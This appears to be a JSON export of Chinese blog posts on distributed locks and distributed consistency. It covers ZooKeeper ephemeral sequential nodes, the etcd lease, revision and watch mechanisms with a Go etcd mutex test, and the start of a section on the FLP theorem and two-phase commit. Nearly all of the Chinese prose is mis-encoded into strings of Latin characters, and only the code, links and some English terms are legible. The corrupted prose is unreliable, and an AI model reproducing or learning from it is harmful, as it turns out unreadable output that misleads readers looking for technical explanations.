é”ä¼šæœ‰æå‰è¿‡æœŸçš„é£é™©ã€‚å®šæ—¶å»æ£€æµ‹è¿™ä¸ªé”çš„å¤±æ•ˆæ—¶é—´ï¼Œå¦‚æœé”å¿«è¦è¿‡æœŸäº†ï¼Œå°±è‡ªåŠ¨å¯¹é”è¿›è¡Œç»­æœŸã€‚\n\n\nå‚è€ƒï¼šhttps://www.liuvv.com/p/e4e467c6.html\n\n# 3. zookeeper\n\nZookeeperçš„èŠ‚ç‚¹Znodeæœ‰å››ç§ç±»å‹ï¼ŒZookeeperåˆ†å¸ƒå¼é”å®ç°åº”ç”¨äº†ä¸´æ—¶é¡ºåºèŠ‚ç‚¹ã€‚\n\n+ æŒä¹…èŠ‚ç‚¹ï¼šé»˜è®¤çš„èŠ‚ç‚¹ç±»å‹ã€‚åˆ›å»ºèŠ‚ç‚¹çš„å®¢æˆ·ç«¯ä¸zookeeperæ–­å¼€è¿æ¥åï¼Œè¯¥èŠ‚ç‚¹ä¾æ—§å­˜åœ¨ã€‚\n+ æŒä¹…èŠ‚ç‚¹é¡ºåºèŠ‚ç‚¹ï¼šæ‰€è°“é¡ºåºèŠ‚ç‚¹ï¼Œå°±æ˜¯åœ¨åˆ›å»ºèŠ‚ç‚¹æ—¶ï¼ŒZookeeperæ ¹æ®åˆ›å»ºçš„æ—¶é—´é¡ºåºç»™è¯¥èŠ‚ç‚¹åç§°è¿›è¡Œç¼–å·ï¼ŒæŒä¹…èŠ‚ç‚¹é¡ºåºèŠ‚ç‚¹å°±æ˜¯æœ‰é¡ºåºçš„æŒä¹…èŠ‚ç‚¹ã€‚\n+ ä¸´æ—¶èŠ‚ç‚¹ï¼šå’ŒæŒä¹…èŠ‚ç‚¹ç›¸åï¼Œå½“åˆ›å»ºèŠ‚ç‚¹çš„å®¢æˆ·ç«¯ä¸zookeeperæ–­å¼€è¿æ¥åï¼Œä¸´æ—¶èŠ‚ç‚¹ä¼šè¢«åˆ é™¤ã€‚\n+ ä¸´æ—¶é¡ºåºèŠ‚ç‚¹ï¼šæœ‰é¡ºåºçš„ä¸´æ—¶èŠ‚ç‚¹ã€‚\n\n### 3.1 è·å–é”\n\nå½“ç¬¬ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚è¿‡æ¥æ—¶ï¼ŒZookeeperå®¢æˆ·ç«¯ä¼šåˆ›å»ºä¸€ä¸ªæŒä¹…èŠ‚ç‚¹locksã€‚å¦‚æœå®ƒ(Client1)æƒ³è·å¾—é”ï¼Œéœ€è¦åœ¨locksèŠ‚ç‚¹ä¸‹åˆ›å»ºä¸€ä¸ªé¡ºåºèŠ‚ç‚¹lock1\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/35c5c0c5904483f6eb4092033c2b2db515ba70.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nå®¢æˆ·ç«¯Client1ä¼šæŸ¥æ‰¾locksä¸‹é¢çš„æ‰€æœ‰ä¸´æ—¶é¡ºåºå­èŠ‚ç‚¹ï¼Œåˆ¤æ–­è‡ªå·±çš„èŠ‚ç‚¹lock1æ˜¯ä¸æ˜¯æ’åºæœ€å°çš„é‚£ä¸€ä¸ªï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æˆåŠŸè·å¾—é”ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/8777b7c77fa6b151c9b051d6cdfae6079a934f.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nè¿™æ—¶å€™å¦‚æœåˆæ¥ä¸€ä¸ªå®¢æˆ·ç«¯client2å‰æ¥å°è¯•è·å¾—é”ï¼Œå®ƒä¼šåœ¨locksä¸‹å†åˆ›å»ºä¸€ä¸ªä¸´æ—¶èŠ‚ç‚¹lock2ã€‚\n\nå®¢æˆ·ç«¯client2ä¸€æ ·ä¹Ÿä¼šæŸ¥æ‰¾locksä¸‹é¢çš„æ‰€æœ‰ä¸´æ—¶é¡ºåºå­èŠ‚ç‚¹ï¼Œåˆ¤æ–­è‡ªå·±çš„èŠ‚ç‚¹lock2æ˜¯ä¸æ˜¯æœ€å°çš„ï¼Œæ­¤æ—¶ï¼Œå‘ç°lock1æ‰æ˜¯æœ€å°çš„ï¼Œäºæ˜¯è·å–é”å¤±è´¥ã€‚è·å–é”å¤±è´¥ï¼Œå®ƒæ˜¯ä¸ä¼šç”˜å¿ƒçš„ï¼Œclient2å‘å®ƒæ’åºé å‰çš„èŠ‚ç‚¹lock1æ³¨å†ŒWatcheräº‹ä»¶ï¼Œç”¨æ¥ç›‘å¬lock1æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´client2æŠ¢é”å¤±è´¥è¿›å…¥ç­‰å¾…çŠ¶æ€ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/d7dfa6d407e3e492e4b54643acda0a0220a28d.png\" alt=\"img\" style=\"zoom:50%;\" />\n\næ­¤æ—¶ï¼Œå¦‚æœå†æ¥ä¸€ä¸ªå®¢æˆ·ç«¯Client3æ¥å°è¯•è·å–é”ï¼Œå®ƒä¼šåœ¨locksä¸‹å†åˆ›å»ºä¸€ä¸ªä¸´æ—¶èŠ‚ç‚¹lock3ã€‚\n\n\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/1804c4d21c8c6ca810763828f747af98327391.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nåŒæ ·çš„ï¼Œclient3ä¸€æ ·ä¹Ÿä¼šæŸ¥æ‰¾locksä¸‹é¢çš„æ‰€æœ‰ä¸´æ—¶é¡ºåºå­èŠ‚ç‚¹ï¼Œåˆ¤æ–­è‡ªå·±çš„èŠ‚ç‚¹lock3æ˜¯ä¸æ˜¯æœ€å°çš„ï¼Œå‘ç°è‡ªå·±ä¸æ˜¯æœ€å°çš„ï¼Œå°±è·å–é”å¤±è´¥ã€‚å®ƒä¹Ÿæ˜¯ä¸ä¼šç”˜å¿ƒçš„ï¼Œå®ƒä¼šå‘åœ¨å®ƒå‰é¢çš„èŠ‚ç‚¹lock2æ³¨å†ŒWatcheräº‹ä»¶ï¼Œä»¥ç›‘å¬lock2èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/c9906cb86de5935b4c2166ea054aa8752d4c77.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\né€šè¿‡ä¸´æ—¶å’Œåºå·çš„åŸç†, åŠ ä¸Š watch çš„åŸç†\n\n+ åˆ›å»ºä¸´æ—¶åºå·èŠ‚ç‚¹\n+ è·å–æœ€å°çš„èŠ‚ç‚¹æ˜¯å¦æ—¶è¯»é”, å¦‚æœæ˜¯è¯», é‚£ä¹ˆè·å¾—é”\n+ å¦‚æœä¸æ˜¯, é˜»å¡ç­‰å¾…,  æ¯ä¸ªèŠ‚ç‚¹åªç›‘å¬å®ƒçš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹, è·å–é€šçŸ¥\n\n### 3.2 é‡Šæ”¾é”\n\nZookeeperçš„å®¢æˆ·ç«¯ä¸šåŠ¡å®Œæˆæˆ–è€…å‘ç”Ÿæ•…éšœï¼Œéƒ½ä¼šåˆ é™¤ä¸´æ—¶èŠ‚ç‚¹ï¼Œé‡Šæ”¾é”ã€‚å¦‚æœæ˜¯ä»»åŠ¡å®Œæˆï¼ŒClient1ä¼šæ˜¾å¼è°ƒç”¨åˆ é™¤lock1çš„æŒ‡ä»¤ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/558949660319c8e55826902285ac7ae8ff8ec2.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nå¦‚æœæ˜¯å®¢æˆ·ç«¯æ•…éšœäº†ï¼Œæ ¹æ®ä¸´æ—¶èŠ‚ç‚¹å¾—ç‰¹æ€§ï¼Œlock1æ˜¯ä¼šè‡ªåŠ¨åˆ é™¤çš„ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/9547bba259631fee14d708eea9a600c58a5009.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nlock1èŠ‚ç‚¹è¢«åˆ é™¤åï¼ŒClient2å¯å¼€å¿ƒäº†ï¼Œå› ä¸ºå®ƒä¸€ç›´ç›‘å¬ç€lock1ã€‚lock1èŠ‚ç‚¹åˆ é™¤ï¼ŒClient2ç«‹åˆ»æ”¶åˆ°é€šçŸ¥ï¼Œä¹Ÿä¼šæŸ¥æ‰¾locksä¸‹é¢çš„æ‰€æœ‰ä¸´æ—¶é¡ºåºå­èŠ‚ç‚¹ï¼Œå‘ä¸‹lock2æ˜¯æœ€å°ï¼Œå°±è·å¾—é”ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/a64b537841302aeae77799893e4ef2995777a2.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n\n\n# 4. etcd\n\n### 4.1 å®ç°åˆ†å¸ƒå¼é”çš„åŸºç¡€\n\n- **Lease æœºåˆ¶**ï¼šå³ç§Ÿçº¦æœºåˆ¶ï¼ˆTTLï¼ŒTime To Liveï¼‰ï¼ŒEtcd å¯ä»¥ä¸ºå­˜å‚¨çš„ Key-Value å¯¹è®¾ç½®ç§Ÿçº¦ï¼Œå½“ç§Ÿçº¦åˆ°æœŸï¼ŒKey-Value å°†å¤±æ•ˆåˆ é™¤ï¼›åŒæ—¶ä¹Ÿæ”¯æŒç»­çº¦ï¼Œé€šè¿‡å®¢æˆ·ç«¯å¯ä»¥åœ¨ç§Ÿçº¦åˆ°æœŸä¹‹å‰ç»­çº¦ï¼Œä»¥é¿å… Key-Value å¯¹è¿‡æœŸå¤±æ•ˆã€‚Lease æœºåˆ¶å¯ä»¥ä¿è¯åˆ†å¸ƒå¼é”çš„å®‰å…¨æ€§ï¼Œä¸ºé”å¯¹åº”çš„ Key é…ç½®ç§Ÿçº¦ï¼Œå³ä½¿é”çš„æŒæœ‰è€…å› æ•…éšœè€Œä¸èƒ½ä¸»åŠ¨é‡Šæ”¾é”ï¼Œé”ä¹Ÿä¼šå› ç§Ÿçº¦åˆ°æœŸè€Œè‡ªåŠ¨é‡Šæ”¾ã€‚\n- **Revision æœºåˆ¶**ï¼šæ¯ä¸ª Key å¸¦æœ‰ä¸€ä¸ª Revision å·ï¼Œæ¯è¿›è¡Œä¸€æ¬¡äº‹åŠ¡ä¾¿åŠ ä¸€ï¼Œå› æ­¤å®ƒæ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå¦‚åˆå§‹å€¼ä¸º 0ï¼Œè¿›è¡Œä¸€æ¬¡ `put(key, value)`ï¼ŒKey çš„ Revision å˜ä¸º 1ï¼ŒåŒæ ·çš„æ“ä½œï¼Œå†è¿›è¡Œä¸€æ¬¡ï¼ŒRevision å˜ä¸º 2ï¼›æ¢æˆ key1 è¿›è¡Œ put(key1, value) æ“ä½œï¼ŒRevision å°†å˜ä¸º 3ï¼›è¿™ç§æœºåˆ¶æœ‰ä¸€ä¸ªä½œç”¨ï¼šé€šè¿‡ Revision çš„å¤§å°å°±å¯ä»¥çŸ¥é“å†™æ“ä½œçš„é¡ºåºã€‚åœ¨å®ç°åˆ†å¸ƒå¼é”æ—¶ï¼Œå¤šä¸ªå®¢æˆ·ç«¯åŒæ—¶æŠ¢é”ï¼Œæ ¹æ® Revision å·å¤§å°ä¾æ¬¡è·å¾—é”ï¼Œå¯ä»¥é¿å… â€œç¾Šç¾¤æ•ˆåº”â€ ï¼ˆä¹Ÿç§°â€œæƒŠç¾¤æ•ˆåº”â€ï¼‰ï¼Œå®ç°å…¬å¹³é”ã€‚\n- **Prefix æœºåˆ¶**ï¼šå³å‰ç¼€æœºåˆ¶ï¼Œä¹Ÿç§°ç›®å½•æœºåˆ¶ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªåä¸º `/mylock` çš„é”ï¼Œä¸¤ä¸ªäº‰æŠ¢å®ƒçš„å®¢æˆ·ç«¯è¿›è¡Œå†™æ“ä½œï¼Œå®é™…å†™å…¥çš„ Key åˆ†åˆ«ä¸ºï¼š`key1=\"/mylock/UUID1\",key2=\"/mylock/UUID2\"`ï¼Œå…¶ä¸­ï¼ŒUUID è¡¨ç¤ºå…¨å±€å”¯ä¸€çš„ IDï¼Œç¡®ä¿ä¸¤ä¸ª Key çš„å”¯ä¸€æ€§ã€‚å¾ˆæ˜¾ç„¶ï¼Œå†™æ“ä½œéƒ½ä¼šæˆåŠŸï¼Œä½†è¿”å›çš„ Revision ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆï¼Œå¦‚ä½•åˆ¤æ–­è°è·å¾—äº†é”å‘¢ï¼Ÿé€šè¿‡å‰ç¼€â€œ/mylockâ€ æŸ¥è¯¢ï¼Œè¿”å›åŒ…å«ä¸¤ä¸ª Key-Value å¯¹çš„ Key-Value åˆ—è¡¨ï¼ŒåŒæ—¶ä¹ŸåŒ…å«å®ƒä»¬çš„ Revisionï¼Œé€šè¿‡ Revision å¤§å°ï¼Œå®¢æˆ·ç«¯å¯ä»¥åˆ¤æ–­è‡ªå·±æ˜¯å¦è·å¾—é”ï¼Œå¦‚æœæŠ¢é”å¤±è´¥ï¼Œåˆ™ç­‰å¾…é”é‡Šæ”¾ï¼ˆå¯¹åº”çš„ Key è¢«åˆ é™¤æˆ–è€…ç§Ÿçº¦è¿‡æœŸï¼‰ï¼Œç„¶åå†åˆ¤æ–­è‡ªå·±æ˜¯å¦å¯ä»¥è·å¾—é”ã€‚\n- **Watch æœºåˆ¶**ï¼šå³ç›‘å¬æœºåˆ¶ï¼ŒWatch æœºåˆ¶æ”¯æŒç›‘å¬æŸä¸ªå›ºå®šçš„ Keyï¼Œä¹Ÿæ”¯æŒç›‘å¬ä¸€ä¸ªèŒƒå›´ï¼ˆå‰ç¼€æœºåˆ¶ï¼‰ï¼Œå½“è¢«ç›‘å¬çš„ Key æˆ–èŒƒå›´å‘ç”Ÿå˜åŒ–ï¼Œå®¢æˆ·ç«¯å°†æ”¶åˆ°é€šçŸ¥ï¼›åœ¨å®ç°åˆ†å¸ƒå¼é”æ—¶ï¼Œå¦‚æœæŠ¢é”å¤±è´¥ï¼Œå¯é€šè¿‡ Prefix æœºåˆ¶è¿”å›çš„ Key-Value åˆ—è¡¨è·å¾— Revision æ¯”è‡ªå·±å°ä¸”ç›¸å·®æœ€å°çš„ Keyï¼ˆç§°ä¸º Pre-Keyï¼‰ï¼Œå¯¹ Pre-Key è¿›è¡Œç›‘å¬ï¼Œå› ä¸ºåªæœ‰å®ƒé‡Šæ”¾é”ï¼Œè‡ªå·±æ‰èƒ½è·å¾—é”ï¼Œå¦‚æœç›‘å¬åˆ° Pre-Key çš„ DELETE äº‹ä»¶ï¼Œåˆ™è¯´æ˜ Pre-Key å·²ç»é‡Šæ”¾ï¼Œè‡ªå·±å·²ç»æŒæœ‰é”ã€‚\n\n### 4.2 è·å–é‡Šæ”¾é”è¿‡ç¨‹\n\nä¸‹é¢æè¿°äº†ä½¿ç”¨ Etcd å®ç°åˆ†å¸ƒå¼é”çš„ä¸šåŠ¡æµç¨‹ï¼Œå‡è®¾å¯¹æŸä¸ªå…±äº«èµ„æºè®¾ç½®çš„é”åä¸ºï¼š`/lock/mylock`ã€‚å®¢æˆ·ç«¯è¿æ¥ Etcdï¼Œä»¥ `/lock/mylock` ä¸ºå‰ç¼€åˆ›å»ºå…¨å±€å”¯ä¸€çš„ Keyã€‚\n\n**è®¾ç½®ç§Ÿçº¦**\n\nå‡è®¾ç¬¬ä¸€ä¸ªå®¢æˆ·ç«¯å¯¹åº”çš„ `Key=\"/lock/mylock/UUID1\"`ï¼Œç¬¬äºŒä¸ªä¸º `Key=\"/lock/mylock/UUID2\"`ï¼›å®¢æˆ·ç«¯åˆ†åˆ«ä¸ºè‡ªå·±çš„ Key åˆ›å»ºç§Ÿçº¦ Leaseï¼Œç§Ÿçº¦çš„é•¿åº¦æ ¹æ®ä¸šåŠ¡è€—æ—¶ç¡®å®šï¼Œå‡è®¾ä¸º 15sã€‚\n\nåœ¨ä¸€ä¸ªå®¢æˆ·ç«¯æŒæœ‰é”æœŸé—´ï¼Œå…¶å®ƒå®¢æˆ·ç«¯åªèƒ½ç­‰å¾…ï¼Œä¸ºäº†é¿å…ç­‰å¾…æœŸé—´ç§Ÿçº¦å¤±æ•ˆï¼Œå®¢æˆ·ç«¯éœ€åˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ä½œä¸ºâ€œå¿ƒè·³â€è¿›è¡Œç»­çº¦ã€‚æ­¤å¤–ï¼Œå¦‚æœæŒæœ‰é”æœŸé—´å®¢æˆ·ç«¯å´©æºƒï¼Œå¿ƒè·³åœæ­¢ï¼ŒKey å°†å› ç§Ÿçº¦åˆ°æœŸè€Œè¢«åˆ é™¤ï¼Œä»è€Œé”é‡Šæ”¾ï¼Œé¿å…æ­»é”ã€‚\n\n**åˆ¤æ–­è·å¾—é”**\n\nè¿›è¡Œ Put æ“ä½œï¼Œå‡è®¾ä¸¤ä¸ªå®¢æˆ·ç«¯ Put æ“ä½œè¿”å›çš„ Revision åˆ†åˆ«ä¸º1ã€2ï¼Œå®¢æˆ·ç«¯éœ€è®°å½• Revision ç”¨ä»¥æ¥ä¸‹æ¥åˆ¤æ–­è‡ªå·±æ˜¯å¦è·å¾—é”ã€‚\n\nå®¢æˆ·ç«¯ä»¥å‰ç¼€ `/lock/mylock` è¯»å– Key-Value åˆ—è¡¨ï¼ˆKey-Value ä¸­å¸¦æœ‰ Key å¯¹åº”çš„ Revisionï¼‰ï¼Œåˆ¤æ–­è‡ªå·± Key çš„ Revision æ˜¯å¦ä¸ºå½“å‰åˆ—è¡¨ä¸­æœ€å°çš„ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºè·å¾—é”ï¼›\n\nè·å¾—é”åï¼Œæ“ä½œå…±äº«èµ„æºï¼Œæ‰§è¡Œä¸šåŠ¡ä»£ç ã€‚å®Œæˆä¸šåŠ¡æµç¨‹åï¼Œåˆ é™¤å¯¹åº”çš„ Key é‡Šæ”¾é”ã€‚\n\n**ç›‘å¬**\n\nå¦åˆ™ç›‘å¬åˆ—è¡¨ä¸­å‰ä¸€ä¸ª Revision æ¯”è‡ªå·±å°çš„ Key çš„åˆ é™¤äº‹ä»¶ï¼Œä¸€æ—¦ç›‘å¬åˆ°åˆ é™¤äº‹ä»¶æˆ–è€…å› ç§Ÿçº¦å¤±æ•ˆè€Œåˆ é™¤çš„äº‹ä»¶ï¼Œåˆ™è‡ªå·±è·å¾—é”ã€‚\n\n<img src=\"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°/d29c3de0-b9c9-11e8-bcd3-a9db59a0d5f6.png\" alt=\"enter image description here\" style=\"zoom:57%;\" />\n\n### 4.3 golangå®ç°\n\n+ https://github.com/etcd-io/etcd/blob/main/tests/integration/clientv3/concurrency/example_mutex_test.go\n\n```go\npackage example\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"sync\"\n\t\"testing\"\n\t\"time\"\n\n\t\"go.etcd.io/etcd/client/v3\"\n\t\"go.etcd.io/etcd/client/v3/concurrency\"\n)\n\nfunc TestMutex_TryLock(t *testing.T) {\n\n\tcli, err := clientv3.New(clientv3.Config{Endpoints: []string{\"127.0.0.1:2379\"}})\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tdefer cli.Close()\n\n\n\ts1, err := concurrency.NewSession(cli)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer s1.Close()\n\t\n  s2, err := concurrency.NewSession(cli)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer s2.Close()\n\n\tm1 := concurrency.NewMutex(s1, \"/my-lock\")\t// åˆ›å»º é”1ï¼Œé”çš„ key å‰ç¼€ä¸º /my-lock\n\tm2 := concurrency.NewMutex(s2, \"/my-lock\")  // é”2\n\n\t// é€šè¿‡ m1 å–è·å–é”, err ç­‰äº nil è¯´æ˜è·å¾—åˆ°äº† é”\n\tif err = m1.Lock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"acquired lock for s1\")\n\n\tif err = m2.Lock(context.TODO()); err == nil {\n\t\t// å› ä¸ºï¼Œé”è¢« m1 æŒæœ‰äº†ï¼Œæ­¤æ—¶ m2 ä¸åº”è¯¥è·å¾—åˆ°é”ï¼Œèµ°åˆ°è¿™é‡Œè¯´æ˜é™¤äº†é—®é¢˜\n\t\tlog.Fatal(\"should not acquire lock\")\n\t}\n\tif err == concurrency.ErrLocked {\n\t\tfmt.Println(\"cannot acquire lock for s2, as already locked in another session\")\n\t}\n\n\t// m1 é‡Šæ”¾é”\n\tif err = m1.Unlock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"released lock for s1\")\n\n\t// m2 è¯•å›¾å»è·å–é”\n\t// å› ä¸º m1 å·²ç»é‡Šæ”¾äº†é”ï¼Œæ‰€ä»¥ m2 ä¼šæˆåŠŸè·å–åˆ°é”\n\tif err = m2.TryLock(context.TODO()); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tfmt.Println(\"acquired lock for s2\")\n\n\t// Output:\n\t// acquired lock for s1\n\t// cannot acquire lock for s2, as already locked in another session\n\t// released lock for s1\n\t// acquired lock for s2\n}\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.51cto.com/article/705985.html\n+ https://pdai.tech/md/arch/arch-z-lock.html\n+ https://learn.lianglianglee.com/","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ","url":"%2Fp%2Fbb1dd10.html","content":"\nä½•ä¸ºä¸€è‡´æ€§é—®é¢˜ï¼Ÿç®€å•è€Œè¨€ï¼Œä¸€è‡´æ€§é—®é¢˜å°±æ˜¯ç›¸äº’ç‹¬ç«‹çš„èŠ‚ç‚¹ä¹‹é—´å¦‚ä½•è¾¾æˆä¸€é¡¹å†³è®®çš„é—®é¢˜ã€‚åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œè¿›è¡Œæ•°æ®åº“äº‹åŠ¡æäº¤(commit transaction)ã€Leaderé€‰ä¸¾ã€åºåˆ—å·ç”Ÿæˆç­‰éƒ½ä¼šé‡åˆ°ä¸€è‡´æ€§é—®é¢˜ã€‚\n\nå‡è®¾ä¸€ä¸ªå…·æœ‰Nä¸ªèŠ‚ç‚¹çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå½“å…¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬è¯´è¿™ä¸ªç³»ç»Ÿæ»¡è¶³ä¸€è‡´æ€§ï¼š\n\n+ å…¨è®¤åŒ(agreement): æ‰€æœ‰Nä¸ªèŠ‚ç‚¹éƒ½è®¤åŒä¸€ä¸ªç»“æœã€‚\n+ å€¼åˆæ³•(validity): è¯¥ç»“æœå¿…é¡»ç”±Nä¸ªèŠ‚ç‚¹ä¸­çš„èŠ‚ç‚¹æå‡ºã€‚\n+ å¯ç»“æŸ(termination): å†³è®®è¿‡ç¨‹åœ¨ä¸€å®šæ—¶é—´å†…ç»“æŸï¼Œä¸ä¼šæ— ä¼‘æ­¢åœ°è¿›è¡Œä¸‹å»ã€‚\n\n<!-- more -->\n\nåˆ†å¸ƒå¼ç³»ç»Ÿå®ç°èµ·æ¥å¹¶ä¸è½»æ¾ï¼Œå› ä¸ºå®ƒé¢ä¸´ç€è¿™äº›é—®é¢˜ï¼š\n\n- æ¶ˆæ¯ä¼ é€’å¼‚æ­¥æ— åº(asynchronous): ç°å®ç½‘ç»œä¸æ˜¯ä¸€ä¸ªå¯é çš„ä¿¡é“ï¼Œå­˜åœ¨æ¶ˆæ¯å»¶æ—¶ã€ä¸¢å¤±ï¼ŒèŠ‚ç‚¹é—´æ¶ˆæ¯ä¼ é€’åšä¸åˆ°åŒæ­¥æœ‰åº(synchronous)\n- èŠ‚ç‚¹å®•æœº(fail-stop): èŠ‚ç‚¹æŒç»­å®•æœºï¼Œä¸ä¼šæ¢å¤\n- èŠ‚ç‚¹å®•æœºæ¢å¤(fail-recover): èŠ‚ç‚¹å®•æœºä¸€æ®µæ—¶é—´åæ¢å¤ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æœ€å¸¸è§\n- ç½‘ç»œåˆ†åŒ–(network partition): ç½‘ç»œé“¾è·¯å‡ºç°é—®é¢˜ï¼Œå°†Nä¸ªèŠ‚ç‚¹éš”ç¦»æˆå¤šä¸ªéƒ¨åˆ†\n- æ‹œå åº­å°†å†›é—®é¢˜(byzantine failure): èŠ‚ç‚¹æˆ–å®•æœºæˆ–é€»è¾‘å¤±è´¥ï¼Œç”šè‡³ä¸æŒ‰å¥—è·¯å‡ºç‰ŒæŠ›å‡ºå¹²æ‰°å†³è®®çš„ä¿¡æ¯ \n\n\n\nä¸€è‡´æ€§è¿˜å…·å¤‡ä¸¤ä¸ªå±æ€§ï¼Œä¸€ä¸ªæ˜¯å¼ºä¸€è‡´(safety)ï¼Œå®ƒè¦æ±‚æ‰€æœ‰èŠ‚ç‚¹çŠ¶æ€ä¸€è‡´ã€å…±è¿›é€€ï¼›ä¸€ä¸ªæ˜¯å¯ç”¨(liveness)ï¼Œå®ƒè¦æ±‚åˆ†å¸ƒå¼ç³»ç»Ÿ24x7æ— é—´æ–­å¯¹å¤–æœåŠ¡ã€‚\n\nFLPå®šç†æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿç†è®ºä¸­çš„åŸºç¡€ç†è®ºï¼Œæ­£å¦‚ç‰©ç†å­¦ä¸­çš„èƒ½é‡å®ˆæ’å®šå¾‹å½»åº•å¦å®šäº†æ°¸åŠ¨æœºçš„å­˜åœ¨ï¼ŒFLPå®šç†å¦å®šäº†åŒæ—¶æ»¡è¶³safety å’Œ liveness çš„ä¸€è‡´æ€§åè®®çš„å­˜åœ¨ã€‚\n\n# 1. 2PC å’Œ 3PC\n\n### 1.1 2PC(tow phase commit)\n\n2PC(tow phase commit)ä¸¤é˜¶æ®µæäº¤[5]é¡¾åæ€ä¹‰å®ƒåˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼Œå…ˆç”±ä¸€æ–¹è¿›è¡Œæè®®(propose)å¹¶æ”¶é›†å…¶ä»–èŠ‚ç‚¹çš„åé¦ˆ(vote)ï¼Œå†æ ¹æ®åé¦ˆå†³å®šæäº¤(commit)æˆ–ä¸­æ­¢(abort)äº‹åŠ¡ã€‚æˆ‘ä»¬å°†æè®®çš„èŠ‚ç‚¹ç§°ä¸ºåè°ƒè€…(coordinator)ï¼Œå…¶ä»–å‚ä¸å†³è®®èŠ‚ç‚¹ç§°ä¸ºå‚ä¸è€…(participants)ã€‚\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/4sf9lptbpv.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯**ã€ŒæŠ•ç¥¨é˜¶æ®µã€**\n\n- 1.åè°ƒè€…é¦–å…ˆå°†å‘½ä»¤ã€Œå†™å…¥æ—¥å¿—ã€\n- 2. ã€Œå‘ä¸€ä¸ªprepareå‘½ä»¤ã€ç»™Bå’ŒCèŠ‚ç‚¹è¿™ä¸¤ä¸ªå‚ä¸è€…\n- 3.Bå’ŒCæ”¶åˆ°æ¶ˆæ¯åï¼Œæ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µï¼Œã€Œåˆ¤æ–­è‡ªå·±çš„å®é™…æƒ…å†µæ˜¯å¦å¯ä»¥æäº¤ã€\n- 4.å°†å¤„ç†ç»“æœã€Œè®°å½•åˆ°æ—¥å¿—ã€ç³»ç»Ÿ\n- 5.å°†ç»“æœã€Œè¿”å›ã€ç»™åè°ƒè€…\n\n<img src=\"åˆ†å¸ƒå¼ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ/26a16oglz0.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nç¬¬äºŒä¸ªé˜¶æ®µæ˜¯**ã€Œå†³å®šé˜¶æ®µã€**\n\nå½“AèŠ‚ç‚¹æ”¶åˆ°Bå’ŒCå‚ä¸è€…æ‰€æœ‰çš„ç¡®è®¤æ¶ˆæ¯å\n\n- ã€Œåˆ¤æ–­ã€æ‰€æœ‰åè°ƒè€…ã€Œæ˜¯å¦éƒ½å¯ä»¥æäº¤ã€\n  - å¦‚æœå¯ä»¥åˆ™ã€Œå†™å…¥æ—¥å¿—ã€å¹¶ä¸”å‘èµ·commitå‘½ä»¤\n  - æœ‰ä¸€ä¸ªä¸å¯ä»¥åˆ™ã€Œå†™å…¥æ—¥å¿—ã€å¹¶ä¸”å‘èµ·abortå‘½ä»¤\n- å‚ä¸è€…æ”¶åˆ°åè°ƒè€…å‘èµ·çš„å‘½ä»¤ï¼Œã€Œæ‰§è¡Œå‘½ä»¤ã€\n- å°†æ‰§è¡Œå‘½ä»¤åŠç»“æœã€Œå†™å…¥æ—¥å¿—ã€\n- ã€Œè¿”å›ç»“æœã€ç»™åè°ƒè€…\n\n\n\ncoordinatoræ ¹æ®participantçš„åé¦ˆï¼Œæäº¤æˆ–ä¸­æ­¢äº‹åŠ¡ï¼Œå¦‚æœparticipantå…¨éƒ¨åŒæ„åˆ™æäº¤ï¼Œåªè¦æœ‰ä¸€ä¸ªparticipantä¸åŒæ„å°±ä¸­æ­¢ã€‚  